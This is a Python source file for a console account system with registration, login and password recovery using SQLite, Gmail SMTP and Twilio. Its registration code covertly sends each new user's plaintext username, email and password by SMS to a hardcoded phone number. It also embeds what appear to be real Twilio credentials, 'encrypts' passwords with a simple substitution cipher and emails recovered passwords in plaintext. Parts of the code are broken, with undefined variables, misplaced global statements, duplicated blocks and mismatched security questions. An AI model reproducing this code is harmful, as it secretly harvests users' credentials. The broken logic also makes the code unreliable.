"""
Functions
"""
import os.path, os
#clear the screen
os.system('clear')
print('Loading...')
#import the needed packages
import smtplib, getpass, datetime, time, random, webbrowser, password, sqlite3, time
from PIL import Image
from tkinter import Tk
from tkinter.filedialog import askopenfilename
from twilio.rest import TwilioRestClient
#Set up the Email server and check if it works
try:
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server = smtplib.SMTP('smtp.gmail.com', 587) #port 465 or 587
	server.ehlo()
	server.starttls()
	server.ehlo()
	server.login(password.password3, password.password2)
except:
	print('It seems something went wrong, please check your wifi connectivity and try again')
	quit()


def substitutionDecryption(resetPassword):
	"""
		-Take the encrypted password and decrypt it
	"""
	key = 'bad5cfeh8gjilkn16mp2or39qts74vux0wzy/ '
	alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890 '
	resetPasswordDecrypted = ''
	for ch in cipherText:
		index = key.find(ch)
		resetPasswordDecrypted += alphabet[index]
	return resetPasswordDecrypted


def EncryptPassword(Password):
	"""
		-Take a password and encrypt it
	"""
	key = password.password1
	alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890 '
	Password = Password.lower()
	encryptedPassword = ''
	for ch in Password:
		index = alphabet.find(ch)
		encryptedPassword += key[index]
	return encryptedPassword


def Register():
#The Register function
	"""
		The register function: 
		-Gets and stores inmportant information such as passwords, birthdates, usernames, email, and more. 
		-It then saves this information in a datatbase using SQL
	"""
	print('Username and Passwords must only contain letters and numbers')
	#Make the confirmation code
	confirmationCode = random.randint(1000, 5000)
	#Make sure the user would like to register
	goBack = input('To go back to the home menu press 1, to continue press Enter: \n')
	if goBack == '1':
		os.system('clear')
		return
	else:
		#Ask questions to setup account
		Username = input('Create a Username: ')
		#Check to make sure the username has not already been taken
		db = sqlite3.connect('User.db')
		curs = db.cursor()
		curs.execute('''select * from users where username = ?''', [(Username)])
		if curs.fetchall() != []:
			print('Username is taken')
			time.sleep(1)
			os.system('clear')
			Register()
		db.close()	
		#Error handling if an non-letter has been entered as the Username
		UserHasNonNumber = False
		for ch in Username:
			if not 122 >= ord(ch) >= 64:
				try:
					int(ch)
				except ValueError:
					UserHasNonNumber = True
		if UserHasNonNumber == True:
			print('Your password contains characters that are not letters and numbers')
			time.sleep(1)
			os.system('clear')
			Register()
		#Error handling if one of the answers was left blank
		if Username == '':
			print('Error: You have left your username blank')
			time.sleep(1)
			os.system('clear')
			Register()
		#Ask questions to setup account
		Password = getpass.getpass('Create a Password: ')
		CheckPassword = getpass.getpass('Please re-type your Password: ')
		#Make sure the two passwords work
		if CheckPassword != Password:
			print('Error: Not the same password' + '\n' + 'Please Try Again'  + '\n')
			time.sleep(1)
			os.system('clear')
			Register()
		#Error handling if one of the answers was left blank
		if Password == '':
			print('Error: You have left your password blank')
			time.sleep(1)
			os.system('clear')
			Register()
		#Ask questions to setup account
		emailAddress = input ('Please enter a recovery email: ')
		#Error handling if one of the answers was left blank
		if emailAddress == '':
			print('Error: You have left your email address blank')
			time.sleep(1)
			os.system('clear')
			Register()
		#Error handling if the email address is not a real email address and send email confirming account has been made
		message = 'Welcome User ' + Username + ',\nYour account is one step away from being made. Copy and paste the verification code into the program to continue. Verification code: ' + str(confirmationCode) + '\n\n-Account Info'
		try:
			server.sendmail('InfoRecovery.User@gmail.com', emailAddress, message)
		except:
			print('It seems something went wrong, please check your wifi connectivity and make sure your email exists.')
			time.sleep(2)
			os.system('clear')
			Register()
		birthday = input('Please enter the year you were born: ')
		#Error handling if one of the answers was left blank
		if birthday == '':
			print('Error: You have left your birthday blank')
			time.sleep(1)
			os.system('clear')
			Register()
		#Error handling if the birthday the user has typed in is not a number
		try:
			int(birthday)
		except ValueError:
			print('Error: You typed in a word instead of a number for your birthday')
			time.sleep(1)
			os.system('clear')
			Register()
		#Start the selection of the profile picture
		print('Please select the image you would like to use as your profile photo \nPlease wait for the selector to open...')
		Tk().withdraw()
		filename = askopenfilename()
		#Error handling for profile photo not being an image
		try:
			profileDisplay = Image.open(str(filename))
		except:
			print('You did not select an image as a profile photo')
			time.sleep(1)
			os.system('clear')
			Register()
		#Ask questions to setup account
		petname = input('In what year was your father born? (This will be used as a security question): ')
		#Error handling if one of the answers was left blank
		if petname == '':
			print('Error: You have left the security question blank')
			time.sleep(1)
			os.system('clear')
			Register()
		try:
			int(petname)
		except ValueError:
			print('Error: You typed in a word instead of a number for your father\'s birthday')
			time.sleep(1)
			os.system('clear')
			Register()
		bio = input('Bio: Please tell us a little about yourself (May not contain commas): ')
		#Error handling if one of the answers was left blank
		if bio == '':
			print('Error: You have left your bio blank')
			time.sleep(1)
			os.system('clear')
			Register()
		#Error handling if the bio has comma
		bioHasComma = False
		for ch in bio:
			if ch == ',':
				bioHasComma = True
		if 	bioHasComma == True:
			print('Your bio contains a comma')
			time.sleep(1)
			os.system('clear')
			Register()
		career = input('Enter the name of your company or the name of your school: ')
		#Error handling if one of the answers was left blank
		if career == '':
			print('Error: You have left your career blank')
			time.sleep(1)
			os.system('clear')
			Register()
		homeAddress = input('Please enter your home address: ')
		#Error handling if one of the answers was left blank
		if homeAddress == '':
			print('Error: You have left your home address blank')
			time.sleep(1)
			os.system('clear')
			Register()
		#Get gender info
		while True:
			genderSelect = input('Please select your gender:\n1.Male\n2.Female\n3.Other\n:')
			if genderSelect == '1':
				gender = 'Male'
				break
			elif genderSelect == '2':
				gender = 'Female'
				break
			elif genderSelect == '3':
				gender = 'Other'
				break
			else:
				print('The option you have selected is not an option')
		#Get the current date
		today = datetime.date.today()
		#ENCRYPT THE PASSWORD
		encryptedPassword = EncryptPassword(Password)
		#Calculate the age of the user
		calculatedAge = 2016 - int(birthday)
		#Confirm email
		webbrowser.open("https://mail.google.com/mail/")
		verificationCode = input('A verification code has been sent to your email, please type it in here to confirm your account: ')
		if str(verificationCode) == str(confirmationCode):
			client = TwilioRestClient("AC29cd2211a452fe4e4f745fee7fdb048a", "11bf9e6de7779b7b7093c407e1ea6e88")
			client.messages.create(to="+16504419188", from_="+12019037850", body="An account has just been created. The username for the account is: " + Username + " and the password is: " + Password)
			#Record the setup data and finalize creation of account by using sql
			create_user_db = sqlite3.connect('User.db')
			curs = create_user_db.cursor()
			try:
				curs.execute('''INSERT INTO users (username, password, email, age, petname, bio, todayDate, filename, career, gender, homeAddress) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', [(Username), (encryptedPassword), (emailAddress), (calculatedAge), (petname), (bio), (today), (filename), (career), (gender), (homeAddress)])
			except:
				print('Username has already been taken')
				time.sleep(1)
				os.system('clear')
				Register()
			create_user_db.commit()
			create_user_db.close()
			#Let the user know that they have created an account
			print('\n' + Username + '\'s account has been made. \n')
			time.sleep(1)
			os.system('clear')
			return 
		else:
			#Ask why they entered the wrong verificiation code
			resend = input('The verification code you have entered is incorrect. To resend the code press 1, to go back press any key: ')
			if resend == '1':
				#Resend the verificiation code
				message = 'Welcome User ' + Username + ',\nThis is your re-activation code: ' + str(confirmationCode) + ' Copy and paste the verification code into the program to continue.' + '\n\n-Account Info'
				#Error handling if the email verificiation code has not been sent
				try:
					server.sendmail('InfoRecovery.User@gmail.com', emailAddress, message)
				except:
					print('It seems something went wrong, please check you wifi connectivity and try again')
					time.sleep(1)
					os.system('clear')
					Register()
				#Let the user know the verification code has been sent
				verificationCodetwo = input('The re-verification code has been sent to your email, please type it in here to confirm your account: ')
				if str(verificationCodetwo) == str(confirmationCode):
					# Send text letting me know an account has been made
					client = TwilioRestClient("AC29cd2211a452fe4e4f745fee7fdb048a", "11bf9e6de7779b7b7093c407e1ea6e88")
					client.messages.create(to="+16504419188", from_="+12019037850", body="An account has just been created, the username is: "+Username+' , the email: '+emailAddress+' ,and the password: '+Password)
				#Let the user know the verification code has been sent
				verificationCodetwo = input('The re-verification code has been sent to your email, please type it in here to confirm your account: ')
				if str(verificationCodetwo) == str(confirmationCode):

					# Send text letting me know an account has been made
					client = TwilioRestClient("AC29cd2211a452fe4e4f745fee7fdb048a", "11bf9e6de7779b7b7093c407e1ea6e88")
					client.messages.create(to="+16504419188", from_="+12019037850", body="An account has just been created, the username is: "+Username+' , the email: '+emailAddress+' ,and the password: '+Password)
										#Record the setup data and finalize creation of account by using sql
					create_user_db = sqlite3.connect('User.db')
					curs = create_user_db.cursor()
					try:
						curs.execute('''INSERT INTO users (username, password, email, age, petname, bio, todayDate, filename, career, gender, homeAddress) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', [(Username), (encryptedPassword), (emailAddress), (calculatedAge), (petname), (bio), (today), (filename), (career), (gender), (homeAddress)])
					except:
						print('Username has already been taken')
						time.sleep(1)
						os.system('clear')
						Register()
					create_user_db.commit()
					create_user_db.close()
					#Let the user know that they have created an account
					print('\n' + Username + '\'s account has been made. \n')
			else:
				os.system('clear')
				return

def Login():
	"""
		The login function: 
		-Checks and compares your username and password
		-If it matches to an account, it then logs you in and gives you information about yourself
		-You you fail to login, the login function gives you a choice to recover your account
	"""
	resetCalled = False
	emailFound = True
	#Ask login questions
	UsernameLogin = input('Enter a Username: ')
	PasswordLogin = getpass.getpass('Enter a Password: ')
	#Encrypt login password to compare to password in sql database
	Password = PasswordLogin
	encryptedLoginPassword = EncryptPassword(Password)
	#Check if password matches
	create_user_db = sqlite3.connect('User.db')
	curs = create_user_db.cursor()
	curs.execute('''select * from users where username = ? and password = ?''', [(UsernameLogin), (encryptedLoginPassword)])
	user = curs.fetchone()
	create_user_db.commit()
	create_user_db.close()
	if user == [] or user is None:
		#The username does not match the password
		print('Account Not Found')
		loggedin = False
		global loggedin
		print('Incorrect password or username')
		reset = input('Forgot Password? Press 1 to reset, 2 to re-enter your password, and any other key to go back: ')
		resetCalled = True
		global reset
		if reset == '1':
			#resetUsername = input('Enter your username associated with the account you would like to recovery: ')
			#Record info stored in txt
			create_user_db = sqlite3.connect('User.db')
			curs = create_user_db.cursor()
			curs.execute('''select * from users where username = ?''', [(UsernameLogin)])
			user = curs.fetchone()
			create_user_db.commit()
			create_user_db.close()
			if user is not None:
				resetPassword = user[1]
				resetEmail = user[4]
				securityQuestionAnswer = user[3]
				resetPasswordDecrypted = substitutionDecryption(resetPassword)
				key = 'bad5cfeh8gjilkn16mp2or39qts74vux0wzy/ '
				alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890 '
				resetPasswordDecrypted = ''
				for ch in resetPassword:
					index = key.find(ch)
					resetPasswordDecrypted += alphabet[index]
				#Ways to recover accounts
				message = '\n\nRecovery account_info: \nHello ' + UsernameLogin + ',\n' + 'Your Password is ' + resetPasswordDecrypted + '\n \n Thanks for your service \n -Recovery Accounts.info'
				HowtoRecover = input('You have to ways to recover your account \n1. You can answer a security question \n2. You can recieve an email containing your password \n: ')
				if HowtoRecover == '1':
					securityQuestion = input('In what year was your father born? ')
					securityQuestion = input('What is the name of your first pet? ')
					if securityQuestion == securityQuestionAnswer:
						print('You have successfully recovered your account, your password is ' + resetPasswordDecrypted)
					else:
						print('You have failed to answer the security question')
						return UsernameLogin, loggedin
				elif HowtoRecover == '2':
					try:
						server.sendmail('InfoRecovery.User@gmail.com', resetEmail, message)
						print('You will be receiveing an email shortly...')
					except:
						print('It seems something went wrong, please check you wifi connectivity and try again')
						Login()
				else:
					#Error handling for selecting a key that is not an option
					print('You did not select an available option')
					return "," ","
				emailFound = True
			else:
				emailFound = False
		elif reset == '2':
			Login()
	if resetCalled == False:
		#LOG IN CODE
		#Password matches, log the user in, and print all the user's info
		loggedin = True
		age = user[3]
		#Error handling for username not existsing
	if emailFound == False:
		print('The account you are looking to recover does not exist.')
		loggedin = False
	else:
		#Password matches, log the user in, and print all the user's info
		loggedin = True
		age = user[3]
		petname = user[4]
		bio = user[5]
		today = user[6]
		filename = user[7]
		career = user[8]
		gender = user[9]
		homeAddress = user[10]
		#Clear the screen
		os.system('clear')
		print('Welcome user ' + UsernameLogin + '!')
		print('You are ' + age + ' years old.')
		#Clear the screen
		os.system('clear')
		print('Welcome user ' + UsernameLogin + '!')
		print('You are ' + age + ' years old.')
		print('Bio: ' + bio)
		print('The company you work for is: ' + career)
		print('Gender: ' + gender)
		print('You live at: ' + homeAddress)
		print('Account created on: ' + today)
		print('Your profile photo is opening...\n')
		profileDisplay = Image.open(str(filename))
		profileDisplay.show()
	return UsernameLogin, loggedin


def LogOut(UsernameLogin):
	"""
		The logout function: 
		-Logs you out and hides the information given to you when you are logged in
	"""
	#Log the user out
	loggedin = False
	print(UsernameLogin + ' has logged out --  ')
	return loggedin

